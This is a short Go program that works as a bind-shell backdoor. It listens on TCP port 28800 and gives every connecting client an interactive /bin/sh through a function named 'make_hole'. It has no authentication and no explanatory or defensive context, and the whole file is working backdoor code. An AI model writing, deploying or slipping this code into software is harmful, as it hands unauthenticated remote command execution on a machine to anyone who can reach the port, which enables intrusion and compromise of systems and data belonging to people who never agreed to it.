package main

import (
	"fmt"
	"net"
	"os/exec"
)

func make_hole(connection net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = connection
	cmd.Stdout = connection
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error occured during shell starting")
	}
}

func main() {
	listener, err := net.Listen("tcp", ":28800")
	if err != nil {
		fmt.Println("Failed to start listener")
		return
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Failed to accept connection")
			continue
		}
		go make_hole(conn)
	}
}
